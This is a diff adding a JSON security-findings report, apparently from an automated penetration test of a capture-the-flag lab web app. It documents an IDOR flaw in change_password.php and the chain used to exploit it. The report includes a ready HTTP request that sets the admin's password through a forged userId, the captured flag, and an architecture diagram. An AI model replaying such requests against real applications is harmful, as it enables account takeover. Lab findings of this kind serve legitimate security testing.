@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T23:44:02.326666+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "038f409c-de63-4fcf-91e9-e8b3d2a0a7b1",
+      "timestamp": "2026-04-12T23:44:02.326524+00:00",
+      "title": "IDOR in change_password.php allows account takeover of any user including admin",
+      "severity": "critical",
+      "target": "http://172.17.0.1:45011/api/change_password.php",
+      "description": "The change_password.php API endpoint accepts a userId parameter in the POST body that is not validated against the authenticated session. The server validates the oldPassword against the SESSION user's password (not the target user's password), but applies the password change to the userId supplied in the request. This allows any authenticated low-privilege user to change any other user's password \u2014 including the admin account \u2014 simply by supplying a different userId value while providing their own current password as oldPassword. Exploitation chain: 1) Register attacker account (gets ID 13), 2) Login as attacker, 3) POST to change_password.php with userId=7 (admin) and oldPassword=<attacker's own password> \u2014 password changed successfully, 4) Login as admin with new password, 5) Access admin profile which reveals the CTF flag.",
+      "evidence": "POST /api/change_password.php with userId=7, oldPassword=Password123! (attacker's own password) returned {\"success\":true,\"message\":\"Password changed successfully.\"}. Logged in as admin. Admin profile page revealed: FLAG: flag{faba79b5-8a02-43ad-aea8-e28cf8fd9024}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /api/change_password.php HTTP/1.1\nHost: 172.17.0.1:45011\nCookie: PHPSESSID=<attacker_session>\nContent-Type: application/x-www-form-urlencoded\n\noldPassword=Password123!&newPassword=AdminHacked123!&confirmPassword=AdminHacked123!&userId=7",
+        "expected": "{\"success\":true,\"message\":\"Password changed successfully.\"}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "5db9acde-5bc1-4c5a-846b-c4b3bf62251a",
+      "timestamp": "2026-04-12T23:44:12.376214+00:00",
+      "title": "IDOR Eats Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser (Bootstrap + jQuery)\"] --> IndexPHP[\"index.php (Home)\"]\n  Browser --> LoginPHP[\"login.php\"]\n  Browser --> RegisterPHP[\"register.php\"]\n  Browser --> ProfilePHP[\"profile.php (auth required)\"]\n  LoginPHP --> APILogin[\"api/login.php POST\"]\n  RegisterPHP --> APIRegister[\"api/register.php POST\"]\n  ProfilePHP --> APIFavs[\"api/get_favorite_restaurants.php GET ?userId=N\"]\n  ProfilePHP --> APIChangePass[\"api/change_password.php POST userId+oldPass+newPass\"]\n  IndexPHP --> APISearch[\"api/search_restaurants.php GET ?query=X\"]\n  APILogin --> DB[(\"MySQL/SQLite DB\")]\n  APIRegister --> DB\n  APIFavs --> DB\n  APIChangePass --> DB\n  APISearch --> DB\n  DB --> Users[\"users table: id, username, email, password, flag\"]\n  DB --> Restaurants[\"restaurants table: id, name, address, category...\"]\n  DB --> Favorites[\"user_favorites table\"]\n  style APIChangePass fill:#ff4444,color:#fff\n  style APIFavs fill:#ff8800,color:#fff"
+    }
+  ]
+}
